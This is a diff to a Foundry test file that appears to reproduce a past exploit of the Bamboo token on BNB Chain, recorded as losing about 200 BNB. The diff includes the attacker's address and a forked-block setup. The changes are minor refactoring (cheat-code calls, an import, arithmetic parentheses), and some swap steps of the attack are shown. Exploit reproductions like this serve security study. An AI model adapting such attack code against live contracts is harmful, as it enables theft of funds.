@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~200BNB
 // Attacker : 0x00703face6621bd207d3b4ac9867058190c0bb09
@@ -28,10 +27,8 @@ contract BambooTest is Test {
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Factory factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 29_668_034);
+        vm.createSelectFork("bsc", 29_668_034);
 
         vm.label(address(wbnb), "WBNB");
         vm.label(address(bamboo), "BAMBOO");
@@ -59,7 +56,7 @@ contract BambooTest is Test {
         path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bamboo);
-        uint256[] memory amounts = router.getAmountsIn(bambooBalance * 9 / 10, path);
+        uint256[] memory amounts = router.getAmountsIn((bambooBalance * 9) / 10, path);
 
         wbnb.approve(address(router), type(uint256).max);
         router.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp);
